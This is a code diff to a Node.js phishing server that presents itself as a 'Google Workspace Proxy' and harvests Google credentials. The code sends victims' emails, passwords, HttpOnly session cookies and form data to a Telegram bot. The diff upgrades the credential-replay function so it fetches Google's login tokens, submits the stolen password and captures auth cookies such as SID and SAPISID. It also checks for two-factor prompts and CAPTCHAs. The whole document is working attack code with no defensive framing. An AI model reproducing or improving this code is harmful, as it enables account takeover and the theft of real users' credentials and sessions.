@@ -33,8 +33,8 @@ const PATHS = {
 };
 
 console.log('╔═══════════════════════════════════════════════════════════╗');
-console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.2                   ║');
-console.log('║        🔐  Full HttpOnly Cookie Capture                 ║');
+console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.3                   ║');
+console.log('║        🔐  OAuth Flow + Full HttpOnly Cookie Capture     ║');
 console.log('╠═══════════════════════════════════════════════════════════╣');
 console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
 console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
@@ -92,7 +92,8 @@ function createSession(email, ip, userAgent) {
         lastActivity: Date.now(),
         attempts: 0,
         verified: false,
-        error: null
+        error: null,
+        oauthStep: 'init'
     };
     console.log(`[SESSION] ✅ Created session ${sessionId.substring(0, 12)} for email: ${email}`);
     return sessionId;
@@ -139,13 +140,19 @@ async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData 
         if (cookies && Object.keys(cookies).length > 0) {
             msg += `\n*🍪 FULL COOKIES (HttpOnly):*\n`;
             for (const [name, value] of Object.entries(cookies)) {
-                msg += `  \`${name}\`: \`${value}\`\n`;
+                const displayValue = value.length > 100 ? value.substring(0, 100) + '...' : value;
+                msg += `  \`${name}\`: \`${displayValue}\`\n`;
             }
         }
         
         // Full form data - NO TRUNCATION
         if (fullData && Object.keys(fullData).length > 0) {
-            msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${JSON.stringify(fullData, null, 2)}\n\`\`\``;
+            const fullDataStr = JSON.stringify(fullData, null, 2);
+            if (fullDataStr.length > 2000) {
+                msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${fullDataStr.substring(0, 2000)}\n... (truncated for Telegram)\n\`\`\``;
+            } else {
+                msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${fullDataStr}\n\`\`\``;
+            }
         }
 
         // Send to Telegram
@@ -176,26 +183,19 @@ async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData 
 }
 
 // ============================================================
-//  ✅ VERIFY WITH GOOGLE - FULL HTTPONLY COOKIE CAPTURE
+//  ✅ VERIFY WITH GOOGLE - OAuth Flow (Most Reliable)
 // ============================================================
 
 function verifyWithGoogle(email, password) {
     return new Promise((resolve) => {
-        const postData = querystring.stringify({
-            Email: email,
-            Passwd: password,
-            accountType: 'HOSTED_OR_GOOGLE',
-            service: 'mail',
-            source: 'Google-Workspace-Proxy'
-        });
+        console.log(`[AUTH] 🔑 Starting OAuth verification for: ${email}`);
         
-        const options = {
+        // Step 1: Get the login page and extract GALX token
+        const getOptions = {
             hostname: 'accounts.google.com',
-            path: '/ServiceLoginAuth',
-            method: 'POST',
+            path: `/ServiceLogin?Email=${encodeURIComponent(email)}&continue=https://mail.google.com/mail&service=mail`,
+            method: 'GET',
             headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Content-Length': Buffer.byteLength(postData),
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.9',
@@ -204,60 +204,175 @@ function verifyWithGoogle(email, password) {
             }
         };
         
-        const req = https.request(options, (res) => {
+        const getReq = https.get(getOptions, (getRes) => {
             let data = '';
-            res.on('data', chunk => data += chunk);
-            res.on('end', () => {
-                // ✅ CAPTURE ALL COOKIES from response headers
-                const cookieHeaders = res.headers['set-cookie'] || [];
+            getRes.on('data', chunk => data += chunk);
+            getRes.on('end', () => {
+                // Capture initial cookies
+                const initialCookies = getRes.headers['set-cookie'] || [];
                 const cookieObj = {};
-                
-                // Parse ALL cookies including HttpOnly
-                cookieHeaders.forEach(cookieString => {
-                    const parts = cookieString.split(';');
-                    const firstPart = parts[0].trim();
-                    const [name, value] = firstPart.split('=');
-                    
-                    if (name && value) {
-                        cookieObj[name] = value;
-                    }
+                initialCookies.forEach(cookie => {
+                    const [name, value] = cookie.split(';')[0].split('=');
+                    if (name && value) cookieObj[name] = value;
                 });
                 
-                // ✅ Log all captured cookies (server-side only)
-                console.log(`[AUTH] 🍪 Captured ${Object.keys(cookieObj).length} cookies`);
-                console.log(`[AUTH] 📋 Cookie names: ${Object.keys(cookieObj).join(', ')}`);
+                // Extract GALX token
+                const galxMatch = data.match(/name="GALX"\s+value="([^"]+)"/i);
+                const galxToken = galxMatch ? galxMatch[1] : '';
                 
-                // Check for Google-specific cookies
-                const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
-                const foundGoogleCookies = googleCookies.filter(name => cookieObj[name]);
-                if (foundGoogleCookies.length > 0) {
-                    console.log(`[AUTH] 🔐 Google Auth Cookies: ${foundGoogleCookies.join(', ')}`);
+                // Extract other form fields
+                const dshMatch = data.match(/name="dsh"\s+value="([^"]+)"/i);
+                const dsh = dshMatch ? dshMatch[1] : '-' + Math.floor(Math.random() * 1000000000);
+                
+                // Check if we need to handle 2FA or other flows
+                const needsTFA = data.includes('two-step') || data.includes('totp');
+                const needsCaptcha = data.includes('captcha') || data.includes('challenge');
+                
+                console.log(`[AUTH] 📋 GALX Token: ${galxToken ? '✅ Found' : '❌ Not found'}`);
+                console.log(`[AUTH] 📋 2FA Required: ${needsTFA ? '✅ Yes' : '❌ No'}`);
+                console.log(`[AUTH] 📋 CAPTCHA Required: ${needsCaptcha ? '⚠️ Yes' : '❌ No'}`);
+                
+                if (needsCaptcha) {
+                    console.log('[AUTH] ⚠️ CAPTCHA detected - will likely fail');
                 }
                 
-                // Check if login was successful
-                const success = data.includes('Gmail') || 
-                              data.includes('https://mail.google.com') ||
-                              data.includes('_auth') ||
-                              data.includes('https://accounts.google.com/') ||
-                              cookieHeaders.some(c => c.includes('SAPISID') || c.includes('HSID') || c.includes('SID'));
-                
-                console.log(`[AUTH] Google verification ${success ? '✅ SUCCESS' : '❌ FAILED'} for ${email}`);
-                
-                resolve({
-                    success: success,
-                    cookies: cookieObj,
-                    html: data,
-                    cookieHeaders: cookieHeaders
+                // Step 2: Submit login with GALX token
+                const postData = querystring.stringify({
+                    Email: email,
+                    Passwd: password,
+                    GALX: galxToken,
+                    dsh: dsh,
+                    continue: 'https://mail.google.com/mail',
+                    service: 'mail',
+                    accountType: 'HOSTED_OR_GOOGLE',
+                    flowName: 'GlifWebSignIn',
+                    flowEntry: 'ServiceLogin',
+                    iframe: '0',
+                    pw: '1',
+                    rl: '0',
+                    gxf: '',
+                    rel: '1',
+                    cb: '0'
                 });
+                
+                const loginOptions = {
+                    hostname: 'accounts.google.com',
+                    path: '/ServiceLoginAuth',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Content-Length': Buffer.byteLength(postData),
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Referer': 'https://accounts.google.com/ServiceLogin',
+                        'Origin': 'https://accounts.google.com',
+                        'Cookie': Object.entries(cookieObj).map(([k, v]) => `${k}=${v}`).join('; '),
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'same-origin',
+                        'Sec-Fetch-User': '?1',
+                        'Upgrade-Insecure-Requests': '1'
+                    }
+                };
+                
+                const loginReq = https.request(loginOptions, (loginRes) => {
+                    let loginData = '';
+                    loginRes.on('data', chunk => loginData += chunk);
+                    loginRes.on('end', () => {
+                        // Capture auth cookies
+                        const authCookies = loginRes.headers['set-cookie'] || [];
+                        const authCookieObj = {};
+                        authCookies.forEach(cookie => {
+                            const [name, value] = cookie.split(';')[0].split('=');
+                            if (name && value) {
+                                authCookieObj[name] = value;
+                            }
+                        });
+                        
+                        // Check for Google auth cookies
+                        const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
+                        const foundAuthCookies = googleCookies.filter(name => authCookieObj[name]);
+                        
+                        console.log(`[AUTH] 🍪 Auth Cookies Received: ${Object.keys(authCookieObj).length}`);
+                        if (foundAuthCookies.length > 0) {
+                            console.log(`[AUTH] 🔐 Google Auth Cookies: ${foundAuthCookies.join(', ')}`);
+                        }
+                        
+                        // Check if login successful
+                        const success = loginData.includes('Gmail') || 
+                                      loginData.includes('https://mail.google.com') ||
+                                      loginData.includes('_auth') ||
+                                      loginRes.headers.location?.includes('mail.google.com') ||
+                                      foundAuthCookies.includes('SAPISID') ||
+                                      foundAuthCookies.includes('HSID');
+                        
+                        // Check for error message
+                        const errorMsg = loginData.match(/<span[^>]*id="errormsg"[^>]*>([^<]+)<\/span>/i);
+                        const errorMsgText = errorMsg ? errorMsg[1].trim() : '';
+                        if (errorMsgText) {
+                            console.log(`[AUTH] ⚠️ Error Message: ${errorMsgText}`);
+                        }
+                        
+                        console.log(`[AUTH] OAuth verification ${success ? '✅ SUCCESS' : '❌ FAILED'} for ${email}`);
+                        
+                        resolve({
+                            success: success,
+                            cookies: authCookieObj,
+                            html: loginData.substring(0, 500),
+                            cookieHeaders: authCookies,
+                            redirectUrl: loginRes.headers.location || null,
+                            statusCode: loginRes.statusCode,
+                            errorMessage: errorMsgText || null
+                        });
+                    });
+                });
+                
+                loginReq.on('error', (err) => {
+                    console.error('[AUTH] ❌ Login request error:', err.message);
+                    resolve({ 
+                        success: false, 
+                        cookies: {}, 
+                        html: '', 
+                        cookieHeaders: [],
+                        redirectUrl: null,
+                        statusCode: 500,
+                        errorMessage: err.message
+                    });
+                });
+                
+                loginReq.write(postData);
+                loginReq.end();
             });
         });
         
-        req.on('error', (err) => {
-            console.error('[AUTH] Error:', err.message);
-            resolve({ success: false, cookies: null, html: '', cookieHeaders: [] });
+        getReq.on('error', (err) => {
+            console.error('[AUTH] ❌ GET request error:', err.message);
+            resolve({ 
+                success: false, 
+                cookies: {}, 
+                html: '', 
+                cookieHeaders: [],
+                redirectUrl: null,
+                statusCode: 500,
+                errorMessage: err.message
+            });
         });
-        req.write(postData);
-        req.end();
+        
+        // Set timeout
+        getReq.setTimeout(15000, () => {
+            console.error('[AUTH] ⏰ Request timed out');
+            getReq.destroy();
+            resolve({ 
+                success: false, 
+                cookies: {}, 
+                html: '', 
+                cookieHeaders: [],
+                redirectUrl: null,
+                statusCode: 408,
+                errorMessage: 'Request timeout'
+            });
+        });
     });
 }
 
@@ -865,7 +980,7 @@ async function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
-        // ✅ Call verifyWithGoogle
+        // ✅ Call verifyWithGoogle with OAuth flow
         const verifyResult = await verifyWithGoogle(email, password);
         
         let allCookies = {};
@@ -980,7 +1095,7 @@ const server = http.createServer((req, res) => {
             uptime: process.uptime(),
             sessions: Object.keys(userSessions).length,
             service: 'Google Workspace Proxy',
-            version: '3.2.0'
+            version: '3.3.0'
         }));
         return;
     }
@@ -1069,8 +1184,8 @@ setInterval(() => {
 
 server.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.2                   ║');
-    console.log('║        🔐  Full HttpOnly Cookie Capture                 ║');
+    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.3                   ║');
+    console.log('║        🔐  OAuth Flow + Full HttpOnly Cookie Capture     ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
     console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
